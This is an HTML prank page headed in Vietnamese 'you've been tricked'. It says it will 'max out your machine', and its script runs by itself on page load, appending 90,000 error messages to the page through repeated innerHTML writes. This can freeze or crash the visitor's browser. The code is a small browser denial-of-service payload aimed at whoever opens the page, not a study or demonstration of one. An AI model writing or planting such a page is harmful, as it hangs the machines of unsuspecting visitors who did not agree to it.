<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Error Simulation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        #errorContainer {
            margin-top: 30px;
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #f5c6cb;
            max-width: 500px;
            margin: 0 auto;
            text-align: left;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
    </style>
</head>
<body>
    <h1>Bị dụ rồi</h1>
    <p>This page runs an infinite loop, displaying errors to max out your machine.</p>
    <div id="errorContainer"></div>

    <script>
        let errorCount = 0;

        function simulateError() {
            errorCount++;
            const errorMessage = `Error ${errorCount}: Simulated error during loop ${errorCount}`;

            const errorContainer = document.getElementById('errorContainer');
            errorContainer.style.display = 'block';
            errorContainer.innerHTML += `<p>${errorMessage}</p>`;

            const maxErrors = 1000000;
            const errorElements = errorContainer.getElementsByTagName('p');
            while (errorElements.length > maxErrors) {
                errorContainer.removeChild(errorElements[0]);
            }

            errorContainer.scrollTop = errorContainer.scrollHeight;
        }

        function stressLoop() {
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
            for (let i = 0; i < 10000; i++) {
                simulateError();
            }
        }

        window.onload = function() {
            stressLoop();
        };
    </script>
</body>
</html>
